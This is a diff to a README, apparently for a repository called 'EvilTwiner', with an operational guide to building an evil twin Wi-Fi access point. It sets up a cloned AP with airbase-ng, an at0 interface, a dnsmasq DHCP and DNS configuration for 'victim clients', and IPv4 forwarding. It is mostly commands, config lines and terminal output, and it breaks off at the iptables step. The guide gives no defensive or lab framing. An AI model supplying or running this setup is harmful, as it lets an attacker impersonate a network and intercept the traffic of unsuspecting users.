@@ -1,11 +1,30 @@
+##############################################################
+# Requirements
+##############################################################
+you need install all this packages on youre linux:
+
+1. aircrack-ng  suite
+2. dnsmasq
+3. net-tools
+4. iptables
+5. two wireless card for monitor mode:
+
+ 5.1: For create the fake AP (DHCP)
+ 5.2: To give internet connection to the victim clients (NAT/DNS)
+
+Examples:   ALFAAWUSACH036 wireless external card
+
+##############################################################
 # EvilTwiner
+##############################################################
 
 On this repository you gonna know how to conf a evil twin wifi network:
 
 first you have to put a monitor mode interface for example wlan0 --> sudo airmon-ng start wlan0:
 
-
-# Create de fake AP
+##############################################################
+# Create de fake AP (1)
+##############################################################
 
 hacker@lol:/var/www$ sudo airbase-ng -e "Wificlon" -c 6 wlan0mon
 [sudo] contraseña para mr-unknow: 
@@ -13,7 +32,9 @@ hacker@lol:/var/www$ sudo airbase-ng -e "Wificlon" -c 6 wlan0mon
 17:34:04  Trying to set MTU on at0 to 1500
 17:34:04  Access Point with BSSID 0A:6F:F6:DC:72:EC started.
 
-# Conf at0 interface:
+##############################################################
+# Conf at0 interface (2):
+##############################################################
 
 hacker@lol:/var/www/myportal$ sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0 up
 
@@ -25,8 +46,9 @@ hacker@lol:/var/www/myportal$ ip addr show at0
     inet6 fe80::5228:4aff:febc:575/64 scope link 
        valid_lft forever preferred_lft forever
 
-
-# Conf DHCP dnsmasq file /etc/dnsmasq.conf:
+##############################################################
+# Conf DHCP dnsmasq file /etc/dnsmasq.conf (3):
+##############################################################
 
 #Conf DHCP dnsmasq
 
@@ -38,7 +60,9 @@ dhcp-range=10.0.0.2,10.0.0.100,12h
 dhcp-option=3,10.0.0.1
 dhcp-option=6,8.8.8.8,8.8.4.4
 
-# Conf dns /etc/resolv.conf:
+##############################################################
+# Conf dns /etc/resolv.conf (4):
+##############################################################
 
 Go to last line and write the next conf:
 
@@ -47,7 +71,9 @@ search 8.8.8.8 8.8.4.4
 nameserver 8.8.8.8
 nameserver 8.8.4.4
 
-# Enable ipv4 traffic /etc/sysctl.conf:
+##############################################################
+# Enable ipv4 traffic /etc/sysctl.conf (5):
+##############################################################
 
 #Uncomment the next line to enable packet forwarding for IPv4
 
@@ -58,12 +84,15 @@ result:
 #Uncomment the next line to enable packet forwarding for IPv4
 net.ipv4.ip_forward=1
 
-
-# Reload dnsmasq service: 
+##############################################################
+# Reload dnsmasq service (6): 
+##############################################################
 
 hacker@lol:/var/www/myportal$ sudo service dnsmasq restart
 
-# Enable traffic rules with iptables:
+##############################################################
+# Enable traffic rules with iptables (7):
+##############################################################
 
 #deletes existent rules
 
